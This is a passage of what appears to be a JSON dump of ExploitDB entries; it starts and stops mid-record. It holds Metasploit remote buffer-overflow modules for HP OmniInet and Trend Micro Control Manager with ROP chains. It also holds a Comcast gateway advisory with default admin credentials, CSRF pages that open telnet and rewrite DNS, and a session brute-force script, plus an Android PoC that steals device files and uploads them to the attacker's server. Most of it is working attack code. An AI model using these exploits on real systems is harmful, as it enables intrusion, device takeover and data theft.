bytes\r\n\t\t\t0x7c351e05,  # NEG EAX # RETN (MSVCR71.dll)\r\n\t\t\t0x7c354901,  # POP EBX # RETN (MSVCR71.dll)\r\n\t\t\t0xffffffff,  # pop value into ebx\r\n\t\t\t0x7c345255,  # INC EBX # FPATAN # RETN (MSVCR71.dll)\r\n\t\t\t0x7c352174,  # ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN (MSVCR71.dll)\r\n\t\t\t0x7c34d201,  # POP ECX # RETN (MSVCR71.dll)\r\n\t\t\t0x7c38b001,  # RW pointer (lpOldProtect) (-> ecx)\r\n\t\t\t0x7c34b8d7,  # POP EDI # RETN (MSVCR71.dll)\r\n\t\t\t0x7c34b8d8,  # ROP NOP (-> edi)\r\n\t\t\t0x7c344f87,  # POP EDX # RETN (MSVCR71.dll)\r\n\t\t\t0xffffffc0,  # value to negate, target value : 0x00000040, target: edx\r\n\t\t\t0x7c351eb1,  # NEG EDX # RETN (MSVCR71.dll)\r\n\t\t\t0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)\r\n\t\t\t0x90909090,  # NOPS (-> eax)\r\n\t\t\t0x7c378c81,  # PUSHAD # ADD AL,0EF # RETN (MSVCR71.dll)\r\n\t\t].pack('V*')\r\n\r\n\t\t#Overflowing path \"C:\\Program Files\\OmniBack\\bin\\\"\r\n\t\t#4807 bytes after target.ret, but we need to use less than that to avoid a busted heap\r\n\t\tsploit = ''\r\n\t\tsploit << rand_text_alpha(target['Offset']-sploit.length)\r\n\t\tsploit << [target.ret].pack('V*')\r\n\t\tsploit << rop\r\n\t\tsploit << payload.encoded\r\n\t\tsploit << rand_text_alpha(target['Max']-sploit.length)\r\n\r\n\t\tpkt  = ''\r\n\t\tpkt << Rex::Text.to_unicode(\"\\x00\")\r\n\t\tpkt << \"\\x41\\x41\"  #Length field place holder\r\n\t\tpkt << \"\\xff\\xfe\"\r\n\t\tpkt << Rex::Text.to_unicode(\"\\x32\\x00\")\r\n\t\tpkt << (Rex::Text.to_unicode(\"\\x20\\x61\\x00\") * 5)\r\n\t\tpkt << Rex::Text.to_unicode(\"\\x20\")\r\n\t\tpkt << Rex::Text.to_unicode(\"20\")  #Opcode\r\n\t\tpkt << \"\\x00\"\r\n\t\tpkt << (Rex::Text.to_unicode(\"\\x20\\x61\\x00\") * 7)\r\n\t\tpkt << Rex::Text.to_unicode(\"\\x20\\x00\")\r\n\t\tpkt << sploit\r\n\t\tpkt << Rex::Text.to_unicode(\"\\x00\")\r\n\t\tpkt << (Rex::Text.to_unicode(\"\\x20\\x61\\x00\") * 16)\r\n\r\n\t\t#pkt length\r\n\t\tpkt[2,2] = [pkt.length-5].pack('n')\r\n\r\n\t\tprint_status(\"Sending packet to #{datastore['RHOST']}...\")\r\n\t\tsock.put(pkt)\r\n\r\n\t\t#Data Protector lags before triggering the vuln code\r\n\t\t#Long delay seems necessary to ensure we get a shell back\r\n\t\tselect(nil,nil,nil,20)\r\n\r\n\t\thandler\r\n\t\tdisconnect\r\n\tend\r\nend",
                "description": "HP OmniInet.exe Opcode 20 - Remote Buffer Overflow (Metasploit)",
                "author": "Metasploit",
                "_id": 17490,
                "source": "ExploitDB",
                "platform": "windows",
                "date": "2011-07-04T00:00:00+00:00",
                "cve": [],
                "type": "remote",
                "port": 0
            },
            {
                "code": "##\r\n# This file is part of the Metasploit Framework and may be subject to\r\n# redistribution and commercial restrictions. Please see the Metasploit\r\n# Framework web site for more information on licensing and terms of use.\r\n#   http://metasploit.com/framework/\r\n##\r\n\r\nrequire 'msf/core'\r\n\r\nclass Metasploit3 < Msf::Exploit::Remote\r\n\tRank = GoodRanking\r\n\r\n\tinclude Msf::Exploit::Remote::Tcp\r\n\r\n\tdef initialize(info={})\r\n\t\tsuper(update_info(info,\r\n\t\t\t'Name'           => \"TrendMicro Control Manger <= v5.5 CmdProcessor.exe Stack Buffer Overflow\",\r\n\t\t\t'Description'    => %q{\r\n\t\t\t\t\tThis module exploits a vulnerability in the CmdProcessor.exe component of Trend\r\n\t\t\t\tMicro Control Manger up to version 5.5.\r\n\r\n\t\t\t\t\tThe specific flaw exists within CmdProcessor.exe service running on TCP port\r\n\t\t\t\t20101. The vulnerable function is the CGenericScheduler::AddTask function of\r\n\t\t\t\tcmdHandlerRedAlertController.dll. When processing a specially crafted IPC packet,\r\n\t\t\t\tcontrolled data is copied into a 256-byte stack buffer. This can be exploited\r\n\t\t\t\tto execute remote code under the context of the user.\r\n\t\t\t},\r\n\t\t\t'License'        => MSF_LICENSE,\r\n\t\t\t'Author'         =>\r\n\t\t\t\t[\r\n\t\t\t\t\t'Luigi Auriemma',  #Initial discovery\r\n\t\t\t\t\t'Blue',            #Metasploit\r\n\t\t\t\t],\r\n\t\t\t'References'     =>\r\n\t\t\t\t[\r\n\t\t\t\t\t['CVE', '2011-5001'],\r\n\t\t\t\t\t['URL', 'http://www.zerodayinitiative.com/advisories/ZDI-11-345/']\r\n\t\t\t\t],\r\n\t\t\t'Payload'        =>\r\n\t\t\t\t{\r\n\t\t\t\t\t'BadChars' => \"\\x00\",\r\n\t\t\t\t},\r\n\t\t\t'DefaultOptions'  =>\r\n\t\t\t\t{\r\n\t\t\t\t\t'ExitFunction' => 'process',\r\n\t\t\t\t},\r\n\t\t\t'Platform'       => 'win',\r\n\t\t\t'Targets'        =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[\r\n\t\t\t\t\t\t# TCM 5.5 cannot be installed in Win2k3 SP0-SP1, Win2k8, or XP\r\n\t\t\t\t\t\t'Windows 2003 Server SP2 (DEP Bypass)',\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t'Ret'    => 0x666b34c8, # TMNotify.dll stack pivot\r\n\t\t\t\t\t\t\t'Offset' => 5000\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t],\r\n\t\t\t\t],\r\n\t\t\t'Privileged'     => false,\r\n\t\t\t'DisclosureDate' => \"Dec 07 2011\",\r\n\t\t\t'DefaultTarget'  => 0))\r\n\r\n\t\t\tregister_options(\r\n\t\t\t[\r\n\t\t\t\tOpt::RPORT(20101)\r\n\t\t\t], self.class)\r\n\tend\r\n\r\n\tdef junk\r\n\t\treturn rand_text(4).unpack(\"L\")[0].to_i\r\n\tend\r\n\r\n\tdef exploit\r\n\r\n\t\t#TmUpdate.dll\r\n\t\trop_chain = [\r\n\t\t\t0x668074d4,\t# POP EDX # OR AL,0F6 # RETN\r\n\t\t\t0x3FCD0FFC,\t# Put 00001000 into edx\r\n\t\t\t0x667611b2,\t# ADD EDX,C0330004 # RETN 04\r\n\t\t\t0x667c99e7,\t# POP EBP # RETN [TmUpdate.dll]\r\n\t\t\tjunk,\r\n\t\t\t0x667c99e7,\t# skip 4 bytes [TmUpdate.dll]\r\n\t\t\t0x667e3250,\t# POP EBX # RETN [TmUpdate.dll]\r\n\t\t\t0xffffffff,\t# NEG EBX\r\n\t\t\t0x6683ab64,\t# INC EBX # XOR EAX,EAX # RETN [TmUpdate.dll]\r\n\t\t\t0x6683ab64,\t# INC EBX # XOR EAX,EAX # RETN [TmUpdate.dll]\r\n\t\t\t0x6680a1d3,\t# POP EAX # RETN [TmUpdate.dll]\r\n\t\t\t0xffffffc0,\t# Value to negate, will become 0x00000040\r\n\t\t\t0x66812b53,\t# NEG EAX # RETN [TmUpdate.dll]\r\n\t\t\t0x667f030a,\t# MOV ECX,EAX # RETN [TmUpdate.dll]\r\n\t\t\t0x667d4c7c,\t# POP EDI # RETN [TmUpdate.dll]\r\n\t\t\t0x667e8003,\t# RETN (ROP NOP) [TmUpdate.dll]\r\n\t\t\t0x667d54d0,\t# POP ESI # RETN [TmUpdate.dll]\r\n\t\t\t0x667baf06,\t# JMP [EAX] [TmUpdate.dll]\r\n\t\t\t0x66833376,\t# POP EAX # RETN [TmUpdate.dll]\r\n\t\t\t0x6686115c,\t# ptr to &VirtualAlloc() [IAT TmUpdate.dll]\r\n\t\t\t0x6681ceb3,\t# PUSHAD # RETN [TmUpdate.dll]\r\n\t\t\t0x668382c3,\t# ptr to 'call esp' [TmUpdate.dll]\r\n\t\t].pack('V*')\r\n\t\t#rop chain generated by mona.py\r\n\r\n\t\theader  = \"\\x00\\x00\"\r\n\t\theader << \"\\x13\\x88\"          #size of buffer\r\n\t\theader << rand_text_alpha(9)\r\n\t\theader << \"\\x15\\x09\\x13\"      #opcode\r\n\t\theader << \"\\x00\\x00\\x00\"\r\n\t\theader << rand_text_alpha(25)\r\n\t\theader << \"\\xFE\\xFF\\xFF\\xFF\"  #in instruction #MOV EDI,DWORD PTR DS:[EAX+ECX] #ECX is our buffer and needs to be readable dword\r\n\t\theader << \"\\xFF\\xFF\\xFF\\xFF\"  #after sum with EAX. Pointer from EAX increments by #LEA EAX,DWORD PTR DS:[EAX+EDI+4] and then is saved\r\n\t\theader << \"\\xFF\\xFF\\xF4\\xFF\"  #and used again. We can essentially walk the loop which increments EBX by 1 until we get to 14 which leads\r\n\t\theader << \"\\xFF\\xFF\"          #us to our vulnerable function\r\n\t\theader << rand_text_alpha(1)  #align stack again for rop\r\n\r\n\t\tpay = rop_chain\r\n\t\tpay << make_nops(374 - rop_chain.length)\r\n\t\tpay << \"\\xeb\\x04\"  #Short jmp 0x04\r\n\t\tpay << [target.ret].pack('V')\r\n\t\tpay << payload.encoded\r\n\r\n\t\tsploit = header\r\n\t\tsploit << pay\r\n\r\n\t\tfiller = rand_text_alpha(target['Offset'] - (sploit.length))\r\n\r\n\t\tconnect\r\n\t\tprint_status(\"Sending request...\")\r\n\t\tsock.put(sploit + filler)\r\n\t\thandler\r\n\t\tdisconnect\r\n\r\n\tend\r\n\r\nend",
                "description": "Trend Micro Control Manger 5.5 - 'CmdProcessor.exe' Remote Stack Buffer Overflow (Metasploit)",
                "author": "Metasploit",
                "_id": 18514,
                "source": "ExploitDB",
                "platform": "windows",
                "date": "2012-02-23T00:00:00+00:00",
                "cve": [],
                "type": "remote",
                "port": 0
            },
            {
                "code": "Trustwave's SpiderLabs Security Advisory TWSL2011-002:\r\nVulnerabilities in Comcast DOCSIS 3.0 Business Gateways\r\n(D3G-CCR)\r\n\r\nhttps://www.trustwave.com/spiderlabs/advisories/TWSL2011-002.txt\r\n\r\nPublished: 2011-02-04\r\nVersion: 1.0\r\n\r\nVendor: Comcast (http://comcast.com)\r\nProduct: Comcast DOCSIS 3.0 Business Gateway - D3G-CCR\r\nVersion affected:  Versions prior to 1.4.0.49.2\r\n\r\nProduct description:\r\nThe Comcast DOCSIS 3.0 Business Gateway provides end-user termination of\r\ncable internet services for Comcast Business Class customers with enhanced\r\nservices including Network Address Translation (NAT), firewalling, and\r\nVirtual Private Network (VPN) termination.\r\n\r\nCredit: Zack Fasel and Matthew Jakubowski of Trustwave's SpiderLabs\r\n\r\nFinding 1: Static Credentials\r\nCVE: CVE-2011-0885\r\n\r\nAll D3G-CCR gateways provided by Comcast have an administrative\r\nlogin of \"mso\" with the password of \"D0nt4g3tme\".  These passwords\r\nare not provided as a part of the installation of the device and are\r\nnot recommended to be changed, thus the majority of users are unaware\r\nof the default configuration.\r\n\r\nWith these default credentials, internal attackers can modify device\r\nconfigurations to leverage more significant attacks, including redirection\r\nof DNS requests, creation of a remote VPN termination point, and\r\nmodification of NAT entries.  These credentials provide access to the web\r\ninterface for management, as well as a telnet interface that provides shell\r\naccess to the device.  The mso login provides shell as UID 0 (root).\r\n\r\n\r\nFinding 2: Cross Site Request Forgery (CSRF)\r\nCVE: CVE-2011-0886\r\nD3G-CCR gateways provided by Comcast permit CSRF attacks against\r\nnumerous management pages allowing an attacker to embed in a webpage a\r\nmalicious request against the gateway's management interface.  Through\r\nthis, an attacker can modify device configuration and enable remote\r\nadministration via a telnet shell and http.\r\n\r\nThe following Proof of Concept (PoC) connects to the gateway, logs in,\r\nmodifies the remote administration to allow any user to connect externally,\r\nand modifies the DNS information.\r\n\r\n## d3g-csrf-poc.htm\r\n\r\n<html>\r\n<body>\r\n<iframe src=\"./d3g-csrf-poc-1.htm\" width=\"1\" height=\"1\">\r\n</iframe>\r\n<iframe src=\"./d3g-csrf-poc-2.htm\" width=\"1\" height=\"1\">\r\n</iframe>\r\n<iframe src=\"./d3g-csrf-poc-3.htm\" width=\"1\" height=\"1\">\r\n</iframe> </body> </html>\r\n\r\n## d3g-csrf-poc-1.htm\r\n\r\n<html>\r\n<body>\r\n<form action=\"http://10.1.10.1/goform/login\" method=\"post\"\r\n\tname=\"tF\">\r\n<input type=\"hidden\" name=\"user\" value=\"mso\" />\r\n<input type=\"hidden\" name=\"pws\" value=\"D0nt4g3tme\" />\r\n</form> <script> document.tF.submit(); </script> </body>\r\n</html>\r\n\r\n## d3g-csrf-poc-2.htm\r\n\r\n<html>\r\n<body>\r\n<form action=\"http://10.1.10.1/goform/RemoteRange\"\r\nname=\"RMangement\" method=\"post\"> <input type=\"hidden\"\r\nvalue=\"feat-admin-remote\" name=\"file\"> <input type=\"hidden\"\r\nvalue=\"admin/\" name=\"dir\"> <input type=\"hidden\"\r\nname=\"RemoteRange\" value=\"0\" /> <input type=\"hidden\"\r\nname=\"rm_access\" value=\"on\" /> <input type=\"hidden\"\r\nname=\"Remote0\" value=\"0.0.0.0,0.0.0.0,1\" /> <input\r\ntype=\"hidden\" name=\"http_port\" value=\"8080\" /> <input\r\ntype=\"hidden\" name=\"http_enable\" value=\"on\" /> <input\r\ntype=\"hidden\" name=\"http_flag\" value=\"1\" /> <input\r\ntype=\"hidden\" name=\"msoremote_enableCheck\" value=\"on\" />\r\n<input type=\"hidden\" name=\"mso_remote_enable\" value=\"1\" />\r\n<input type=\"hidden\" name=\"remote_enable\" value=\"0\" />\r\n<input type=\"hidden\" name=\"https_enable\" value=\"on\" />\r\n<input type=\"hidden\" name=\"https_port\" value=\"8181\" />\r\n<input type=\"hidden\" name=\"https_flag\" value=\"1\" /> <input\r\ntype=\"hidden\" name=\"telnet_enable\" value=\"on\" /> <input\r\ntype=\"hidden\" name=\"telnet_port\" value=\"2323\" /> <input\r\ntype=\"hidden\" name=\"telnet_flag\" value=\"1\" /> <input\r\ntype=\"hidden\" name=\"Remote1=\" value=\"\" /> </form> </body>\r\n</html> <script>\r\nsetTimeout(\"document.RMangement.submit()\",4000);\r\n</script>\r\n</body>\r\n</html>\r\n\r\n## d3g-csrf-poc-3.htm\r\n\r\n<html>\r\n<body>\r\n<form name=\"WanIPform\"\r\naction=\"http://10.1.10.1/goform/Basic\" method=\"post\"> <input\r\ntype=\"hidden\" value=\"feat-wan-ip\" name=\"file\"> <input\r\ntype=\"hidden\" value=\"admin/\" name=\"dir\"> <input\r\ntype=\"hidden\" value=\"Fixed\" name=\"DNSAssign\"> <input\r\ntype=\"hidden\" value=\"0\" name=\"dhcpc_release\"> <input\r\ntype=\"hidden\" value=\"0\" name=\"dhcpc_renew\"> <input\r\ntype=\"hidden\" value=\"\" name=\"domain_name\"> <input\r\ntype=\"hidden\" value=\"\" name=\"WDn\"> <input type=\"hidden\"\r\nname=\"SysName\" value=\"\" /> <input type=\"hidden\"\r\nname=\"manual_dns_enable\" value=\"on\" /> <input type=\"hidden\"\r\nname=\"DAddr\" value=\"4.2.2.1\" /> <input type=\"hidden\"\r\nname=\"DAddr0\" value=\"4\" /> <input type=\"hidden\"\r\nname=\"DAddr1\" value=\"2\" /> <input type=\"hidden\"\r\nname=\"DAddr2\" value=\"2\" /> <input type=\"hidden\"\r\nname=\"DAddr3\" value=\"1\" /> <input type=\"hidden\"\r\nname=\"PDAddr\" value=\"4.2.2.2\" /> <input type=\"hidden\"\r\nname=\"PDAddr0\" value=\"4\" /> <input type=\"hidden\"\r\nname=\"PDAddr1\" value=\"2\" /> <input type=\"hidden\"\r\nname=\"PDAddr2\" value=\"2\" /> <input type=\"hidden\"\r\nname=\"PDAddr3\" value=\"2\" /> </form> <script>\r\nsetTimeout(\"document.WanIPform.submit()\",5000);\r\n</script>\r\n</body>\r\n</html>\r\n\r\nIf the PoC was embedded in any web page the targeted user visited while\r\nlogged into the device, the attacker would be provided remote\r\nadministration in to the gateway device include a telnet shell.  This would\r\nallow the attacker to redirect traffic to a malicious end-point.\r\n\r\n\r\nFinding 3: Weak Session Management \r\nCVE: CVE-2011-0887\r\nD3G-CCR gateways provided by Comcast utilize a predictable value to\r\nvalidate the active web management portal session.  The epoch time of\r\nbeginning of the session is stored as a cookie labeled \"userid\".  This\r\nprovides a predictable range of session IDs that can be brute-forced.\r\n\r\nThe following PoC attempts to brute force the session IDs by requesting the\r\nadmin page with an incrementing cookie and determining whether it wants to\r\nredirect to login.asp.\r\n\r\n## d3g-session-poc.sh\r\n\r\n#!/bin/bash\r\nstart=1267604160\r\nend=1267605960\r\nfor (( i=$start; i<=$end; i++)) do if [ `curl -sb userid=$i\r\nhttp://10.1.10.1/admin/index.asp | grep -c login.asp` -lt\r\n\"1\" ] then echo \"Session ID Found:  $i\"\r\nfi\r\nif [ $(($i % 100)) -eq \"0\" ]\r\nthen echo \"Currently at $i\"\r\nfi\r\ndone\r\n\r\nThrough this, an attacker can brute-force the possible valid session IDs.\r\nSessions do by default expire within 10 minutes, thus the attack window is\r\nlimited but can be leveraged with other attack methods.\r\n\r\n\r\nVendor Response:\r\nThese issues have been addressed as of version 1.4.0.49.2\r\n\r\nRemediation Steps:\r\nIn order to determine if the correct version is installed, users should\r\nview the \"About\" link in the management interface. Versions 1.4.0.49.2 and\r\nabove have been corrected.\r\n\r\nVendor Communication Timeline:\r\n08/30/10 - Vulnerability disclosed\r\n01/21/11 - Patch Released\r\n02/04/11 - Advisory Published\r\n\r\nRevision History:\r\n1.0 Initial publication\r\n\r\n\r\nAbout Trustwave:\r\nTrustwave is the leading provider of on-demand and subscription-based\r\ninformation security and payment card industry compliance management\r\nsolutions to businesses and government entities throughout the world. For\r\norganizations faced with today's challenging data security and compliance\r\nenvironment, Trustwave provides a unique approach with comprehensive\r\nsolutions that include its flagship TrustKeeper compliance management\r\nsoftware and other proprietary security solutions. Trustwave has helped\r\nthousands of organizations--ranging from Fortune 500 businesses and large\r\nfinancial institutions to small and medium-sized retailers--manage\r\ncompliance and secure their network infrastructure, data communications and\r\ncritical information assets. Trustwave is headquartered in Chicago with\r\noffices throughout North America, South America, Europe, Africa, China and\r\nAustralia. For more information, visit https://www.trustwave.com\r\n\r\nAbout Trustwave's SpiderLabs:\r\nSpiderLabs(R) is the advanced security team at Trustwave focused on\r\napplication security, incident response, penetration testing, physical\r\nsecurity and security research. The team has performed over a thousand\r\nincident investigations, thousands of penetration tests and hundreds of\r\napplication security tests globally. In addition, the SpiderLabs Research\r\nteam provides intelligence through bleeding-edge research and proof of\r\nconcept tool development to enhance Trustwave's products and services.\r\nhttps://www.trustwave.com/spiderlabs\r\n\r\nDisclaimer:\r\nThe information provided in this advisory is provided \"as is\" without\r\nwarranty of any kind. Trustwave disclaims all warranties, either express or\r\nimplied, including the warranties of merchantability and fitness for a\r\nparticular purpose. In no event shall Trustwave or its suppliers be liable\r\nfor any damages whatsoever including direct, indirect, incidental,\r\nconsequential, loss of business profits or special damages, even if\r\nTrustwave or its suppliers have been advised of the possibility of such\r\ndamages. Some states do not allow the exclusion or limitation of liability\r\nfor consequential or incidental damages so the foregoing limitation may not\r\napply.",
                "description": "Comcast DOCSIS 3.0 Business Gateways - Multiple Vulnerabilities",
                "author": "Trustwave's SpiderLabs",
                "_id": 16123,
                "source": "ExploitDB",
                "platform": "hardware",
                "date": "2011-02-06T00:00:00+00:00",
                "cve": [
                    "CVE-2011-0885",
                    "CVE-2011-0886",
                    "CVE-2011-0887"
                ],
                "type": "remote",
                "port": 0
            },
            {
                "code": "<?php \r\n/* \r\n* Description:  Android 'content://' URI Multiple Information Disclosure Vulnerabilities\r\n* Bugtraq ID:   48256\r\n* CVE:          CVE-2010-4804\r\n* Affected:     Android < 2.3.4\r\n* Author:       Thomas Cannon\r\n* Discovered:   18-Nov-2010\r\n* Advisory:     http://thomascannon.net/blog/2010/11/android-data-stealing-vulnerability/\r\n*\r\n* Filename:     poc.php\r\n* Instructions: Specify files you want to upload in filenames array. Host this php file\r\n*               on a server and visit it using the Android Browser. Some builds of Android\r\n*               may require adjustments to the script, for example when a German build was\r\n*               tested it downloaded the payload as .htm instead of .html, even though .html\r\n*               was specified. \r\n*\r\n* Tested on:    HTC Desire (UK Version) with Android 2.2\r\n*/\r\n\r\n//  List of the files on the device that we want to upload to our server\r\n$filenames = array(\"/proc/version\",\"/sdcard/img.jpg\");\r\n\r\n//  Determine the full URL of this script\r\n$protocol = $_SERVER[\"HTTPS\"] == \"on\" ? \"https\" : \"http\";\r\n$scripturl = $protocol.\"://\".$_SERVER[\"HTTP_HOST\"].$_SERVER[\"SCRIPT_NAME\"];\r\n\r\n//  Stage 0:  Display introduction text and a link to start the PoC.\r\nfunction stage0($scripturl) {\r\n  echo \"<b>Android < 2.3.4</b><br>Data Stealing Web Page<br><br>Click: <a href=\\\"$scripturl?stage=1\\\">Malicious Link</a>\";\r\n}\r\n\r\n//  Stage 1:  Redirect to Stage 2 which will force a download of the HTML/JS payload, then a few seconds later redirect \r\n//            to the payload. We load the payload using a Content Provider so that the JavaScript is executed in the\r\n//            context of the local device - this is the vulnerability.\r\nfunction stage1($scripturl) {\r\n  echo \"<body onload=\\\"setTimeout('window.location=\\'$scripturl?stage=2\\'',1000);setTimeout('window.location=\\'content://com.android.htmlfileprovider/sdcard/download/poc.html\\'',5000);\\\">\";\r\n}\r\n\r\n//  Stage 2:  Download of payload, the Android browser doesn't prompt for the download which is another vulnerability.\r\n//            The payload uses AJAX calls to read file contents and encodes as Base64, then uploads to server (Stage 3).\r\nfunction stage2($scripturl,$filenames) {\r\n  header(\"Cache-Control: public\");\r\n  header(\"Content-Description: File Transfer\");\r\n  header(\"Content-Disposition: attachment; filename=poc.html\");\r\n  header(\"Content-Type: text/html\");\r\n  header(\"Content-Transfer-Encoding: binary\");\r\n?>\r\n<html>\r\n  <body>\r\n    <script language='javascript'>\r\n      var filenames = Array('<?php echo implode(\"','\",$filenames); ?>');\r\n      var filecontents = new Array();\r\n      function processBinary(xmlhttp) {\r\n        data = xmlhttp.responseText;    r = '';   size = data.length;\r\n        for(var i = 0; i < size; i++)   r += String.fromCharCode(data.charCodeAt(i) & 0xff);\r\n        return r;\r\n      }\r\n      function getFiles(filenames) {\r\n        for (var filename in filenames) {\r\n          filename = filenames[filename];\r\n          xhr = new XMLHttpRequest();\r\n          xhr.open('GET', filename, false);\r\n          xhr.overrideMimeType('text/plain; charset=x-user-defined');\r\n          xhr.onreadystatechange = function() { if (xhr.readyState == 4) { filecontents[filename] = btoa(processBinary(xhr)); } }\r\n          xhr.send();\r\n        }\r\n      }\r\n      function addField(form, name, value) {\r\n        var fe = document.createElement('input');\r\n        fe.setAttribute('type', 'hidden');\r\n        fe.setAttribute('name', name);\r\n        fe.setAttribute('value', value);\r\n        form.appendChild(fe);\r\n      }\r\n      function uploadFiles(filecontents) {\r\n        var form = document.createElement('form');\r\n        form.setAttribute('method', 'POST');\r\n        form.setAttribute('enctype', 'multipart/form-data');\r\n        form.setAttribute('action', '<?=$scripturl?>?stage=3');\r\n        var i = 0;\r\n        for (var filename in filecontents) {\r\n          addField(form, 'filename'+i, btoa(filename));\r\n          addField(form, 'data'+i, filecontents[filename]);\r\n          i += 1;\r\n        }\r\n        document.body.appendChild(form);\r\n        form.submit();\r\n      }\r\n      getFiles(filenames);\r\n      uploadFiles(filecontents);\r\n    </script>\r\n  </body>\r\n</html>\r\n<?php\r\n}\r\n\r\n//  Stage 3:  Read the file names and contents sent by the payload and write to a file on the server.\r\nfunction stage3() {\r\n  $fp = fopen(\"files.txt\", \"w\") or die(\"Couldn't open file for writing!\");\r\n  fwrite($fp, print_r($_POST, TRUE)) or die(\"Couldn't write data to file!\"); \r\n  fclose($fp); \r\n  echo \"Data uploaded to <a href=\\\"files.txt\\\">files.txt</a>!\";\r\n}\r\n\r\n//  Select the stage to run depending on the parameter passed in the URL\r\nswitch($_GET[\"stage\"]) { \r\n  case \"1\": \r\n    stage1($scripturl); \r\n    break; \r\n  case \"2\": \r\n    stage2($scripturl,$filenames); \r\n    break; \r\n  case \"3\": \r\n    stage3(); \r\n    break;\r\n  default: \r\n    stage0($scripturl); \r\n    break; \r\n} \r\n?>",
                "description": "Google Android - 'content://' URI Multiple Information Disclosure Vulnerabilities",
                "author": "Thomas Cannon",
                "_id": 18164,
                "source": "ExploitDB",
                "platform": "android",
                "date": "2011-11-28T00:00:00+00:00",
                "cve": [
                    "CVE-2010-4804"
                ],
                "type": "webapps",
                "port": 0
            },
            {
                "code": "#!/usr/bin/python\r\n# \r\n# Exploit Title: CyberLink Multiple Products File Project Handling Stack Buffer Overflow POC\r\n# by: modpr0be[at]spentera[dot]com (@modpr0be)\r\n# Platform: Windows\r\n# Tested on: Windows XP SP3, Windows 7 SP1 with:\r\n# \tCyberLink Power2Go 7 (build 196)\r\n# \tCyberLink Power2Go 8 (build 1031)\r\n# \tCyberLink WaveEditor 2.0 (build 2204)\r\n# Software Link: http://www.cyberlink.com/downloads/trials/index_en_US.html\r\n# CVE : -\r\n\r\n### Software Description\r\n# CyberLink Power2Go is all-media disc burning software. \r\n# Copy all your media to any disc with Power2Go 8! With new System Recovery tools \r\n# and over 5000 free DVD menus to choose from on DirectorZone.com, Power2Go 8 not \r\n# only burns everything but allows you to create pro-like DVDs, rip CDs and \r\n# safeguard valuable data. \r\n\r\n# CyberLink Wave Editor will help user to convert audio format when producing, editing, \r\n# or creating backups for some audios or videos. This additional tools is also included \r\n# since PowerDirector 9 to PowerDirector 10, and now included on Power2Go 8.\r\n\r\n### Vulnerability Details\r\n# Most of CyberLink products contain built-in project file with their own format and\r\n# extension. This file usually contains our recently modified project or work.\r\n# Most of this filetypes contain this section:\r\n#     <File src=\r\n#     <File name=\r\n# Generally, those sections will be filled with source path or filename. \r\n# both products will lead us to command execution because the address of \r\n# SE Handler is overwritten with 0x00410041.\r\n\r\n# Notes:\r\n# I cannot find any good return address for WaveEditor, if you can make it\r\n# through the hard way, kudos!!\r\n\r\n### Vendor logs:\r\n# 10/10/2011 - Bug found\r\n# 10/11/2011 - Vendor contacted\r\n# 10/11/2011 - Vendor replied and requested POC\r\n# 10/11/2011 - POC sent to vendor\r\n# 10/31/2011 - Vendor said the POC will be researched\r\n# 10/27/2011 - Submitted to CERT\r\n# 11/09/2011 - CyberLink updated the product\r\n# 11/09/2011 - POC still works on the latest version\r\n# 12/09/2011 - No response from vendor, POC release.\r\n\r\nimport time,sys\r\n\r\ndef power2go():\r\n\t# header for power2go\r\n\theader = (\r\n\t\"\\x3c\\x50\\x72\\x6f\\x6a\\x65\\x63\\x74\\x20\\x6d\\x61\\x67\\x69\\x63\"\r\n\t\"\\x3d\\x22\\x69\\x6e\\x73\\x65\\x63\\x75\\x72\\x69\\x74\\x79\\x22\\x20\"\r\n\t\"\\x76\\x65\\x72\\x73\\x69\\x6f\\x6e\\x3d\\x22\\x31\\x30\\x31\\x22\\x3e\"\r\n\t\"\\x0d\\x0a\\x3c\\x49\\x6e\\x66\\x6f\\x72\\x6d\\x61\\x74\\x69\\x6f\\x6e\"\r\n\t\"\\x2f\\x3e\\x0d\\x0a\\x3c\\x43\\x6f\\x6d\\x70\\x69\\x6c\\x61\\x74\\x69\"\r\n\t\"\\x6f\\x6e\\x3e\\x0d\\x0a\\x3c\\x44\\x61\\x74\\x61\\x44\\x69\\x73\\x63\"\r\n\t\"\\x20\\x0d\\x0a\\x64\\x69\\x73\\x63\\x4e\\x61\\x6d\\x65\\x3d\\x22\\x49\"\r\n\t\"\\x4e\\x53\\x45\\x43\\x55\\x52\\x49\\x54\\x59\\x22\\x20\\x0d\\x0a\\x66\"\r\n\t\"\\x69\\x6c\\x65\\x44\\x61\\x74\\x65\\x3d\\x22\\x6f\\x72\\x69\\x67\\x69\"\r\n\t\"\\x6e\\x61\\x6c\\x22\\x20\\x66\\x69\\x6c\\x65\\x54\\x69\\x6d\\x65\\x3d\"\r\n\t\"\\x22\\x30\\x22\\x20\\x0d\\x0a\\x64\\x69\\x73\\x63\\x54\\x79\\x70\\x65\"\r\n\t\"\\x3d\\x22\\x63\\x64\\x22\\x20\\x0d\\x0a\\x73\\x65\\x73\\x73\\x69\\x6f\"\r\n\t\"\\x6e\\x53\\x69\\x7a\\x65\\x3d\\x22\\x30\\x22\\x20\\x0d\\x0a\\x50\\x4f\"\r\n\t\"\\x57\\x42\\x75\\x72\\x6e\\x65\\x64\\x53\\x69\\x7a\\x65\\x3d\\x22\\x30\"\r\n\t\"\\x22\\x20\\x0d\\x0a\\x53\\x65\\x63\\x75\\x72\\x65\\x64\\x44\\x61\\x74\"\r\n\t\"\\x61\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x57\\x68\"\r\n\t\"\\x6f\\x6c\\x65\\x53\\x65\\x63\\x75\\x72\\x65\\x64\\x44\\x61\\x74\\x61\"\r\n\t\"\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x53\\x65\\x63\"\r\n\t\"\\x75\\x72\\x69\\x74\\x79\\x4b\\x65\\x79\\x53\\x69\\x7a\\x65\\x3d\\x22\"\r\n\t\"\\x31\\x36\\x22\\x20\\x0d\\x0a\\x48\\x69\\x64\\x65\\x46\\x69\\x6c\\x65\"\r\n\t\"\\x4e\\x61\\x6d\\x65\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\"\r\n\t\"\\x0a\\x62\\x6f\\x6f\\x74\\x61\\x62\\x6c\\x65\\x3d\\x22\\x66\\x61\\x6c\"\r\n\t\"\\x73\\x65\\x22\\x20\\x0d\\x0a\\